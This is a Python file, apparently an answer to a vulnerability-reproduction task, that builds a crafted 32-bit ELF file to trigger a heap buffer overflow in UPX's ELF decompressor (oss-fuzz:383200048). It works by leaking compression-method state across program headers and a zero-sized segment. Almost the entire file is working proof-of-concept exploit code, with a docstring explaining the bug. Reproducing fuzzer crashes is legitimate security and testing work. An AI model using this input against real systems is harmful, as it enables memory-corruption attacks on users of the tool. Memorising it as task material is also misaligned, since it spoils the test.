import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a heap buffer
        overflow in the UPX ELF decompression logic (oss-fuzz:383200048).

        The vulnerability exists because a state variable (`ph.method`) is not
        reset between processing different program headers. This allows a
        specially crafted ELF file to cause the decompressor to enter an
        inconsistent state, leading to a crash.

        The PoC is a 32-bit ELF file with three program headers:
        1. A PT_LOAD segment with non-zero file size. Processing this segment
           causes UPX to read metadata from a crafted trailer at the end of the
           file, setting `ph.method` to a non-zero value (e.g., 8 for LZMA).
        2. A second PT_LOAD segment with zero file size and zero memory size.
           This is a BSS-like segment. Due to the state leak, the non-zero
           `ph.method` from the first segment is carried over, causing the
           decompressor to mishandle this segment. The zero memory size also
           causes the main decompression buffer to be allocated with size 0.
        3. A special program header with the type 'UPX!', used to signal
           a UPX-packed file and provide metadata.

        The combination of the leaked state and the zero-sized buffer leads to
        a heap buffer overflow when the `un_DT_INIT` function is called for
        shared library unpacking, as it attempts to perform memory operations
        on the improperly sized buffer.
        """
        poc = bytearray(512)

        # ELF Header (Elf32_Ehdr)
        ehdr_format = '<16sHHIIIIIHHHHHH'
        poc[0:struct.calcsize(ehdr_format)] = struct.pack(
            ehdr_format,
            b'\x7fELF\x01\x01\x01' + b'\x00' * 9,  # e_ident
            3,      # e_type = ET_DYN
            3,      # e_machine = EM_386
            1,      # e_version
            0,      # e_entry
            0x34,   # e_phoff
            0,      # e_shoff
            0,      # e_flags
            0x34,   # e_ehsize
            0x20,   # e_phentsize
            3,      # e_phnum
            0,      # e_shentsize
            0,      # e_shnum
            0       # e_shstrndx
        )

        # Program Header Table
        phdr_format = '<IIIIIIII'
        phdr_size = struct.calcsize(phdr_format)

        # Program Header 1: PT_LOAD segment that sets the malicious state.
        # Values are based on the original fuzzer-generated PoC.
        offset = 0x34
        poc[offset:offset+phdr_size] = struct.pack(
            phdr_format,
            1,          # p_type = PT_LOAD
            0,          # p_offset
            0xd0000,    # p_vaddr
            0xd0000,    # p_paddr
            0x12e,      # p_filesz
            0x200,      # p_memsz
            5,          # p_flags (R+X)
            0x1000      # p_align
        )

        # Program Header 2: PT_LOAD trigger segment (p_filesz=0, p_memsz=0).
        offset += phdr_size
        poc[offset:offset+phdr_size] = struct.pack(
            phdr_format,
            1,          # p_type = PT_LOAD
            0x1f8,      # p_offset
            0xd0200,    # p_vaddr
            0xd0200,    # p_paddr
            0,          # p_filesz
            0,          # p_memsz
            6,          # p_flags (R+W)
            0x1000      # p_align
        )

        # Program Header 3: UPX metadata header.
        offset += phdr_size
        poc[offset:offset+4] = b'UPX!'
        poc[offset+4:offset+phdr_size] = b'\x00' * (phdr_size - 4)

        # UPX Trailer Data
        # UPX reads metadata (l_info, b_info) from the end of the file.
        file_size = len(poc)
        num_phdrs = 3
        sz_b_info = 12
        sz_l_info = 32
        
        # Calculate the offset of the b_info struct array.
        b_info_offset = file_size - (num_phdrs * sz_b_info) - sz_l_info

        # The compression method is at an offset of 8 bytes inside the b_info struct.
        b_method_offset_in_struct = 8
        
        # Calculate the file offset for the method of the first block (b_info[0]).
        b_info0_method_offset = b_info_offset + b_method_offset_in_struct
        
        # Set the method to 8 (LZMA) to trigger the state leak.
        poc[b_info0_method_offset] = 8

        return bytes(poc)
